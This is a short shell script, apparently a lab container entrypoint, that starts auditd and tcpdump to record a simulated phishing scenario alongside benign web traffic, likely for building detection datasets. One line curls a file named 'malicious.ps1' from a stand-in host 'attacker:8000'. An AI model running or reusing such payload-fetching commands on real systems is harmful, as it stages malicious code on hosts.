#!/bin/sh
SERVICE_NAME=${SERVICE_NAME:-$(hostname)}

# 1. 启动 auditd
service auditd start

# 2. 启动 tcpdump
tcpdump -i any -s 65535 -w /data/raw/${SERVICE_NAME}_$(date +%s).pcap &

# 3. 等 tcpdump 就绪
sleep 2

# 4. 模拟用户在浏览器里点了个钓鱼链接，下载并执行 payload
echo "[*] Downloading malicious payload"
curl -f http://attacker:8000/malicious.ps1 -o /tmp/malicious.ps1 || echo "Download failed"

# 生成一些正常流量
sleep $((RANDOM%5+1))
echo "[*] Generating benign traffic"
curl -f http://example.com -o /dev/null 2>&1 || echo "Benign traffic failed"

# 6. 阻塞保持容器活着
touch /data/raw/.keepalive
exec tail -f /data/raw/.keepalive
